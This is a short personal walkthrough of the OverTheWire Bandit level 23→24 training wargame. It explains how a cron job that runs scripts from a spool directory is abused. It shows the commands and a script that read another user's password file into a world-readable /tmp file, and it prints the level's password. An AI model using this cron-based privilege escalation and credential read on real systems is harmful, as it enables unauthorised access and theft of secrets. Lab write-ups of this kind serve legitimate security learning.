# Bandit Level 23 → 24

**Topic:** A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

## Goal

A cron job executes scripts placed in a special directory. The objective is to create a script that runs as user bandit24 and retrieves the password for the next level.

The solution involved placing a custom shell script in the cron execution directory. When cron executed the script under the bandit24 account, it copied the password from the protected location into a file accessible to bandit23.

## Commands used

```bash
mkdir /tmp/myscript

cat > /tmp/myscript/getpass.sh
chmod 777 /tmp/myscript/getpass.sh

cp /tmp/myscript/getpass.sh /var/spool/bandit24/foo

cat /tmp/bandit24_pass.txt
```

## Example script

```bash
    #!/bin/bash
    cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass.txt
    chmod 644 /tmp/bandit24_pass.txt
```

Password for bandit24: `gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw`

## What I learned

- How cron can automatically execute scripts from specific directories.
- How scheduled tasks can run with the permissions of another user.
- How to create and deploy shell scripts for automated execution.
- How file permissions control access to sensitive data.
- How privilege separation works in Linux.
- How temporary files can be used to transfer information between users.
- How to use chmod to make scripts executable.
